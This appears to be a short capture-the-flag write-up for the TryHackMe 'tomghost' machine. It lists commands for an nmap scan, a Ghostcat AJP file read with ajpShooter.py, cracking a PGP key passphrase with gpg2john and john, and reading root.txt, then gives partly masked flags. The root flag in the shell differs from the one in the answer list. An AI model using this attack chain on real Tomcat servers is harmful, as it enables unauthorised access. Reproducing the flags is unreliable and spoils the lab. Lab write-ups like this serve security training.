...
```
bibo318@parrot:~/CTFs/tryhackme/tomghost$ sudo nmap -A -Pn -sC -sV -O 10.10.58.11
...
```
bibo318@parrot:~/CTFs/tryhackme/tomghost$ python3 ajpShooter.py http://10.10.58.11:8080/ 8009 /WEB-INF/web.xml read
...
```
bibo318@parrot:~/CTFs/tryhackme/tomghost$ gpg2john tryhackme.asc > tryhackme.hash

File tryhackme.asc

bibo318@parrot:~/CTFs/tryhackme/tomghost$ john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.hash
...
bibo318@parrot:~/CTFs/tryhackme/tomghost$ gpg --import tryhackme.asc
...
bibo318@parrot:~/CTFs/tryhackme/tomghost$ gpg --decrypt credential.pgp
...
# cd /root
# cat root.txt
THM{V0N318*****Z1P_1S_FAKE}
#
```

1. Compromise this machine and obtain user.txt

`THM{V0N318*****GhostCat_1s_so_cr4sy12**123:))}`

2. Escalate privileges and obtain root.txt

`THM{V0N318*****Z1P_1S_FAKE12**123:))}`
